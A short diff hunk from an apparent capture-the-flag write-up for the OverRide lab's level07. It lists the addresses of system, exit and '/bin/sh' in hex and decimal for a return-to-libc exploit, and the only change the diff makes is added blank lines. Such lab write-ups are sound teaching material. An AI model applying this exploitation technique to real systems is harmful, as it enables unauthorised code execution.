@@ -188,7 +188,9 @@ Now, we just have to find the adresses of system, "/bin/sh", and exit (to gracef
 Now we need to convert these addresses to decimal and store them using the binary :
 
 system :    0xf7e6aed0 <=> 4159090384
+
 exit :      0xf7e5eb70 <=> 4159040368
+
 /bin/sh :   0xf7f897ec <=> 4160264172
 
 level07@OverRide:~$ ./level07 
